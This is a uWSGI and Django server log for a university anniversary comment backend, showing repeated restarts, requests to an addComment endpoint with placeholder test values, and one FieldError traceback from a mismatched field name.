+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x55c316f64cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55c316f64cb0 pid: 28197 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28197)
+spawned uWSGI worker 1 (pid: 28198, cores: 1)
+[pid: 28198|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 1004 bytes} [Sun May 31 03:13:59 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 29 bytes in 1327 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
+Sun May 31 03:15:13 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:15:14 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x55b49f45ecb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55b49f45ecb0 pid: 28206 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28206)
+spawned uWSGI worker 1 (pid: 28207, cores: 1)
+Internal Server Error: /addComment/计算机系-17级-7班-张三-祝福-123
+Traceback (most recent call last):
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
+    response = get_response(request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 115, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/core/handlers/base.py", line 113, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./backendApi/views.py", line 39, in addComment
+    QAQ = models.Comment.objects.filter(Department = comment.Department, Grade = comment.Grade, Identity = comment.Identity, Name = comment.Name, comment = comment.Comment, phone = comment.phone)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/manager.py", line 82, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/query.py", line 904, in filter
+    return self._filter_or_exclude(False, *args, **kwargs)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/query.py", line 923, in _filter_or_exclude
+    clone.query.add_q(Q(*args, **kwargs))
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1351, in add_q
+    clause, _ = self._add_q(q_object, self.used_aliases)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1382, in _add_q
+    check_filterable=check_filterable,
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1251, in build_filter
+    lookups, parts, reffed_expression = self.solve_lookup_type(arg)
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1088, in solve_lookup_type
+    _, field, _, lookup_parts = self.names_to_path(lookup_splitted, self.get_meta())
+  File "/root/miniconda3/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1484, in names_to_path
+    "Choices are: %s" % (name, ", ".join(available)))
+django.core.exceptions.FieldError: Cannot resolve keyword 'comment' into field. Choices are: Comment, Count, Department, Grade, Identity, Name, UID, phone
+[pid: 28207|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 1004 bytes} [Sun May 31 03:15:16 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 103400 bytes in 1665 msecs (HTTP/1.1 500) 5 headers in 157 bytes (2 switches on core 0)
+Sun May 31 03:15:49 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:15:50 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x55fbab5f5cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55fbab5f5cb0 pid: 28211 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28211)
+spawned uWSGI worker 1 (pid: 28212, cores: 1)
+[pid: 28212|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 1004 bytes} [Sun May 31 03:15:51 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 29 bytes in 1398 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
+[pid: 28212|app: 0|req: 2/2] 122.238.122.231 () {44 vars in 1004 bytes} [Sun May 31 03:15:56 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 29 bytes in 1153 msecs (HTTP/1.1 200) 4 headers in 127 bytes (2 switches on core 0)
+Sun May 31 03:16:17 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:16:17 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x556c945aacb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x556c945aacb0 pid: 28216 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28216)
+spawned uWSGI worker 1 (pid: 28217, cores: 1)
+[pid: 28217|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 1004 bytes} [Sun May 31 03:16:18 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 168 bytes in 1339 msecs (HTTP/1.1 200) 4 headers in 136 bytes (1 switches on core 0)
+Sun May 31 03:16:43 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:16:43 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x5628f2b87cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x5628f2b87cb0 pid: 28221 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28221)
+spawned uWSGI worker 1 (pid: 28222, cores: 1)
+[pid: 28222|app: 0|req: 1/1] 122.238.122.231 () {44 vars in 1004 bytes} [Sun May 31 03:16:45 2020] GET /addComment/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB-17%E7%BA%A7-7%E7%8F%AD-%E5%BC%A0%E4%B8%89-%E7%A5%9D%E7%A6%8F-123 => generated 26 bytes in 3168 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
+Sun May 31 03:17:43 2020 - uWSGI worker 1 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+*** Starting uWSGI 2.0.18 (64bit) on [Sun May 31 11:17:43 2020] ***
+compiled with version: 7.3.0 on 22 July 2019 16:51:41
+os: Linux-4.15.0-48-generic #51-Ubuntu SMP Wed Apr 3 08:28:49 UTC 2019
+nodename: Quasrain
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /root/HIT-100th-Anniversary-Celebration/backend
+detected binary path: /root/miniconda3/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to .
+your processes number limit is 7798
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address ./backend.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.3 | packaged by conda-forge | (default, Jul  1 2019, 21:52:21)  [GCC 7.3.0]
+Python main interpreter initialized at 0x564bb50a5cb0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 145840 bytes (142 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x564bb50a5cb0 pid: 28230 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 28230)
+spawned uWSGI worker 1 (pid: 28231, cores: 1)
